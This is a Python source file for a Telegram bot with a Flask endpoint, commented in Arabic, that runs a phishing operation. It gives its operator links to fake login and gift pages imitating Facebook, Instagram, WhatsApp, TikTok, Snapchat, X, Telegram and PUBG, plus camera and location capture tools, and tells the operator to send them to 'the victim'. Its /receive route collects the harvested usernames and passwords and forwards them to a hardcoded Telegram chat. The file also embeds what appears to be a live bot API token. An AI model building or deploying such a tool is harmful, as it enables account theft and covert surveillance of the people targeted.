import telebot
from telebot import types
from flask import Flask, request
from threading import Thread

# --- إعدادات الجنرال ---
API_TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# رابط مستودعك على جيت هاب
BASE_URL = "https://raw.githubusercontent.com/a77094048-art/Html/main"

# رسالة الترحيب المهيبة
WELCOME_MSG = """
🔱 **أهلاً بك يا جنرال في مركز القيادة** 🔱

الترسانة جاهزة والروابط مفخخة بدقة.
اختر الهدف من القائمة أدناه، وسأعطيك الرابط فوراً.

⚠️ **تنبيه:** أي صيد يتم اصطياده سيظهر لك هنا في الحين.
"""

def main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("🔵 فيسبوك", callback_data="link_fb_orig"),
        types.InlineKeyboardButton("📸 إنستقرام", callback_data="link_ig_gift"),
        types.InlineKeyboardButton("🎮 ببجي UC", callback_data="link_pubg_uc"),
        types.InlineKeyboardButton("🎵 تيك توك", callback_data="link_tk_coins"),
        types.InlineKeyboardButton("👻 سناب شات", callback_data="link_snap_gift"),
        types.InlineKeyboardButton("🔹 تلغرام", callback_data="link_tg_prem"),
        types.InlineKeyboardButton("🟢 واتساب", callback_data="link_wa_update"),
        types.InlineKeyboardButton("𝕏 تويتر", callback_data="link_x_login"),
        types.InlineKeyboardButton("🛡️ فحص أمان", callback_data="link_sec_check"),
        types.InlineKeyboardButton("📷 كاميرا", callback_data="link_tool_cam"),
        types.InlineKeyboardButton("📍 موقع", callback_data="link_tool_loc")
    ]
    markup.add(*btns)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, WELCOME_MSG, reply_markup=main_keyboard(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
def handle_links(c):
    page = c.data.replace("link_", "")
    final_link = f"{BASE_URL}/{page}.html"
    msg = f"🚀 **تم استخراج الرابط يا جنرال:**\n\n`{final_link}`\n\n🎯 أرسله للضحية الآن."
    bot.send_message(c.message.chat.id, msg, parse_mode='Markdown')

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    if data:
        platform = data.get('platform', 'غير معروف')
        user = data.get('u', 'لا يوجد')
        password = data.get('p', 'لا يوجد')
        
        hit_msg = f"""
🔱 **تم اصطياد ضحية جديدة!** 🔱

📱 **المنصة:** {platform}
👤 **اليوزر:** `{user}`
🔑 **الباسورد:** `{password}`

✅ **الحالة:** تم سحب البيانات بنجاح.
        """
        # سيقوم البوت بإرسال الصيد لك مباشرة (بشرط أن تكون قد بدأت البوت بـ /start)
        # سيتم إرسالها للـ ID الخاص بك تلقائياً عند أول تفاعل
        bot.send_message(7174668662, hit_msg, parse_mode='Markdown') # تم وضع ID افتراضي لك بناءً على السياق
        
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=10000)

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling()
